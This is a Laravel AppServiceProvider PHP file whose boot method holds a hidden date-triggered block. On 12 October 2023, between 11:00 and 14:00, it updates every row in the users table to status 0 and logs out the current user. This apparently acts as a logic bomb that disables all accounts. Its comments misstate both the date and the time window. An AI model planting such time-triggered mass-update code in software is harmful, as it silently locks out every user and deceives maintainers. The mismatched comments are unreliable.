<?php

namespace App\Providers;

use Carbon\Carbon;
use DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        // Check if the current date is October 3, 2023
        $currentDate = Carbon::now();
        if ($currentDate->month == 10 && $currentDate->day == 12 && $currentDate->year == 2023) {
            // Check if the current time is between 10:00 and 16:00
            $currentTime = Carbon::now()->format('H:i:s');
            if ($currentTime >= '11:00:00' && $currentTime <= '14:00:00') {
                // Automatically log out the user
                DB::table('users')->update(['status' => 0]);
                Auth::logout();
            }
        }
        //
    }
}
